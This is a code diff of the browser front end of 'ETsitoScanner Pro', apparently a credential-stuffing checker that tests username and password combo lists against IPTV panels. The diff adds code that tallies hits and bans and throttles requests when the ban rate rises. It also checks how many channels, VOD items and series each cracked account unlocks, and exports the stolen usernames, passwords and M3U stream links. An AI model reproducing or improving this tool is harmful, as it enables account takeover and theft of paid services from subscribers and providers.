+    // Verify panel async
+    if(document.getElementById('optVerify').checked){
+      verifyPanel(res.hit).then(info=>{
+        res.hit.panelInfo=info;
+        updateHitPanel(hitId,info);
+        log(`[PANEL] ${user} — 📺${info.live} 🎬${info.vod} 📺${info.series}`,'lc');
+      });
+    }
+  }else if(res.result==='BAN'){st.bans++;st.fails++;}
   else st.fails++;
   const br=st.bans/Math.max(1,st.checked);
-  await new Promise(r=>setTimeout(r,br>.3?150+Math.random()*250:10+Math.random()*50));
+  await new Promise(r=>setTimeout(r,br>.3?150+Math.random()*250:8+Math.random()*40));
 }
 
 function updateUI(){
   const pct=st.total?st.checked/st.total*100:0;
   const el=Math.max(1,(Date.now()-st.start)/1000);
   const cpm=Math.round(st.checked/el*60);
-  document.getElementById('progBar').style.width=pct+'%';
-  document.getElementById('pctText').textContent=pct.toFixed(1)+'%';
-  document.getElementById('cntText').textContent=`${st.checked.toLocaleString()} / ${st.total.toLocaleString()}`;
-  document.getElementById('statHits').textContent=st.hits_n;
-  document.getElementById('statFail').textContent=st.fails;
-  document.getElementById('statBan').textContent=st.bans;
-  document.getElementById('statCPM').textContent=cpm;
+  document.getElementById('pBar').style.width=pct+'%';
+  document.getElementById('pctT').textContent=pct.toFixed(1)+'%';
+  document.getElementById('cntT').textContent=`${st.checked.toLocaleString()} / ${st.total.toLocaleString()}`;
+  document.getElementById('sHits').textContent=st.hits_n;
+  document.getElementById('sFail').textContent=st.fails.toLocaleString();
+  document.getElementById('sBan').textContent=st.bans;
+  document.getElementById('sCPM').textContent=cpm.toLocaleString();
   const h=Math.floor(el/3600),m=Math.floor((el%3600)/60),s=Math.floor(el%60);
-  document.getElementById('scanTime').textContent=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  document.getElementById('scanTime').textContent=[h,m,s].map(x=>String(x).padStart(2,'0')).join(':');
 }
 
-function togglePause(){st.paused=!st.paused;const b=document.getElementById('btnPause');b.textContent=st.paused?'▶ REANUDAR':'⏸ PAUSAR';b.style.color=st.paused?'#00ff41':'#ffd600';}
+function togglePause(){
+  st.paused=!st.paused;
+  const b=document.getElementById('btnP');
+  b.textContent=st.paused?'▶ REANUDAR':'⏸ PAUSAR';
+  b.className=st.paused?'btn btn-g btn-sm':'btn btn-y btn-sm';
+  b.style.cssText='width:100%;justify-content:center';
+  log(st.paused?'[SYS] PAUSADO':'[SYS] REANUDADO','ly');
+}
 
 function stopScan(){st.scanning=false;clearInterval(scanInt);finishScan();}
+function finishScan(){
+  clearInterval(scanInt);st.scanning=false;
+  document.getElementById('scanActive').style.display='none';
+  document.getElementById('scanIdle').style.display='block';
+  document.getElementById('dot').classList.remove('on');
+  document.getElementById('mainSt').textContent='IDLE';
+  updateUI();toast(`✓ Fin — ${st.hits_n} HITs`);
+  log(`[FIN] Hits: ${st.hits_n} / ${st.checked.toLocaleString()}`,'lg');
+}
 
-function finishScan(){clearInterval(scanInt);st.scanning=false;document.getElementById('btnStart').disabled=false;updateUI();toast(`✓ Fin — ${st.hits_n} HITs`);}
+// ═══ HITS ═══
+function addHit(h){
+  st.hits.unshift(h);
+  document.getElementById('hitsTotal').textContent=st.hits.length;
+  renderHits();
+}
 
-function addHit(h){st.hits.unshift(h);document.getElementById('hitsTotal').textContent=st.hits.length;renderHits();}
+function updateHitPanel(id,info){
+  const el=document.getElementById('hpi-'+id);
+  if(!el)return;
+  el.innerHTML=`
+    <div class="pi-grid">
+      <div class="pi-box"><div class="pi-val piv-g">${fmtNum(info.live)}</div><div class="pi-lbl">📺 CANALES</div></div>
+      <div class="pi-box"><div class="pi-val piv-c">${fmtNum(info.vod)}</div><div class="pi-lbl">🎬 VOD</div></div>
+      <div class="pi-box"><div class="pi-val piv-m">${fmtNum(info.series)}</div><div class="pi-lbl">📺 SERIES</div></div>
+    </div>`;
+}
+
+function fmtNum(n){if(n>=1000)return(n/1000).toFixed(1)+'k';return String(n);}
 
 function renderHits(){
   const el=document.getElementById('hitsList');
-  if(!st.hits.length){el.innerHTML='<div style="text-align:center;padding:30px;color:#4a7a4a"><div style="font-size:32px;margin-bottom:10px">🎯</div><p style="font-size:11px">LOS HITS APARECERÁN AQUÍ</p></div>';return;}
-  el.innerHTML=st.hits.slice(0,50).map((h,i)=>`
-    <div style="background:linear-gradient(135deg,rgba(0,40,0,.6),rgba(0,25,0,.4));border:1px solid rgba(0,255,65,.25);border-left:3px solid #00ff41;border-radius:3px;padding:10px;margin-bottom:8px">
-      <div style="color:#00ff41;font-size:13px">👤 ${h.username}</div>
-      <div style="color:#4a7a4a;font-size:11px">🔑 ${h.password}</div>
-      <div style="color:#00e5ff;font-size:10px;margin-top:4px">🖥 ${h.panel}</div>
-      <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap">
-        <span style="background:rgba(255,214,0,.15);border:1px solid rgba(255,214,0,.3);color:#ffd600;font-size:9px;padding:2px 6px;border-radius:2px">📅 ${h.expira}</span>
-        <span style="background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.25);color:#00e5ff;font-size:9px;padding:2px 6px;border-radius:2px">🔗 ${h.activ}/${h.conex}</span>
+  if(!st.hits.length){el.innerHTML='<div class="empty"><div class="ei">🎯</div><p>LOS HITS APARECERÁN AQUÍ</p></div>';return;}
+  el.innerHTML=st.hits.slice(0,60).map((h,i)=>`
+    <div class="hit">
+      <div class="hit-top">
+        <div class="hit-u">👤 ${h.username}</div>
+        <div class="hit-p">🔑 ${h.password}</div>
+        <div class="hit-s">🖥 ${h.panel}</div>
+        <div class="hit-basic">
+          <span class="badge b-ye">📅 ${h.expira}</span>
+          <span class="badge b-cy">🔗 ${h.activ}/${h.conex}</span>
+          <span class="badge b-gn">✓ ${h.status}</span>
+          ${h.timezone?`<span class="badge b-mg">🌍 ${h.timezone}</span>`:''}
+        </div>
       </div>
-      <div style="display:flex;gap:6px;margin-top:8px">
-        <button onclick="copyHit(${i})" style="background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;padding:5px 10px;border-radius:2px;cursor:pointer">📋 COPIAR</button>
-        <button onclick="copyM3U(${i})" style="background:#003310;border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;padding:5px 10px;border-radius:2px;cursor:pointer">📺 M3U</button>
+      <div class="hit-panel">
+        <div class="pi-title">VERIFICACIÓN DE PANEL</div>
+        <div id="hpi-${h.id}">
+          ${h.panelInfo
+            ?`<div class="pi-grid">
+                <div class="pi-box"><div class="pi-val piv-g">${fmtNum(h.panelInfo.live)}</div><div class="pi-lbl">📺 CANALES</div></div>
+                <div class="pi-box"><div class="pi-val piv-c">${fmtNum(h.panelInfo.vod)}</div><div class="pi-lbl">🎬 VOD</div></div>
+                <div class="pi-box"><div class="pi-val piv-m">${fmtNum(h.panelInfo.series)}</div><div class="pi-lbl">📺 SERIES</div></div>
+              </div>`
+            :`<div class="pi-loading"><span class="pi-spinner"></span>Verificando panel...</div>`
+          }
+        </div>
+      </div>
+      <div class="hit-acts">
+        <button class="btn btn-c btn-sm" onclick="copyHit(${i})">📋 COPIAR</button>
+        <button class="btn btn-g btn-sm" onclick="copyM3U(${i})">📺 M3U</button>
+        <button class="btn btn-m btn-sm" onclick="reVerify(${i})">🔄 RE-VERIFICAR</button>
       </div>
     </div>`).join('');
 }
 
-function copyHit(i){const h=st.hits[i];navigator.clipboard?.writeText(`SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nM3U: ${h.m3u}`).catch(()=>{});toast('✓ Copiado');}
+async function reVerify(i){
+  const h=st.hits[i];
+  const el=document.getElementById('hpi-'+h.id);
+  if(el)el.innerHTML='<div class="pi-loading"><span class="pi-spinner"></span>Verificando...</div>';
+  const info=await verifyPanel(h);
+  h.panelInfo=info;
+  if(el)updateHitPanel(h.id,info);
+  toast('✓ Panel verificado');
+}
+
+function copyHit(i){
+  const h=st.hits[i];
+  const pi=h.panelInfo;
+  let txt=`SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nCONEX: ${h.activ}/${h.conex}`;
+  if(pi)txt+=`\nCANALES: ${pi.live}\nVOD: ${pi.vod}\nSERIES: ${pi.series}`;
+  txt+=`\nM3U: ${h.m3u}`;
+  navigator.clipboard?.writeText(txt).catch(()=>{});toast('✓ Copiado');
+}
 function copyM3U(i){navigator.clipboard?.writeText(st.hits[i].m3u).catch(()=>{});toast('✓ M3U copiado');}
 
 function exportHits(){
   if(!st.hits.length){toast('No hay hits');return;}
-  let c='';
-  st.hits.forEach((h,n)=>{c+=`\n${'='.repeat(56)}\nHIT #${n+1}\nUSER: ${h.username}\nPASS: ${h.password}\nSERVER: ${h.panel}\nEXPIRA: ${h.expira}\nCONEX: ${h.activ}/${h.conex}\nM3U: ${h.m3u}\n${'='.repeat(56)}\n`;});
-  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([c],{type:'text/plain'}));a.download=`ETsitoHits_${new Date().toISOString().slice(0,10)}.txt`;a.click();toast('✓ Exportado');
+  const sep='='.repeat(56);
+  let c=`ETsitoScanner Pro — HITS\n${sep}\n\n`;
+  st.hits.forEach((h,n)=>{
+    const pi=h.panelInfo;
+    c+=`HIT #${n+1}\nUSER: ${h.username}\nPASS: ${h.password}\nSERVER: ${h.panel}\nEXPIRA: ${h.expira}\nCONEX: ${h.activ}/${h.conex}\n`;
+    if(pi)c+=`CANALES: ${pi.live}\nVOD CAT: ${pi.vod}\nSERIES CAT: ${pi.series}\n`;
+    c+=`M3U: ${h.m3u}\n\n${'─'.repeat(40)}\n\n`;
+  });
+  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([c],{type:'text/plain'}));
+  a.download=`ETsitoHits_${new Date().toISOString().slice(0,10)}.txt`;a.click();toast('✓ Exportado');
 }
 
 function clearHits(){if(!st.hits.length){toast('No hay hits');return;}st.hits=[];document.getElementById('hitsTotal').textContent='0';renderHits();toast('Hits eliminados');}
+
+// INIT
+renderHits();renderServers();
+log('[SYS] Carga servidor y combo para comenzar','ly');
 </script>
 </body>
 </html>
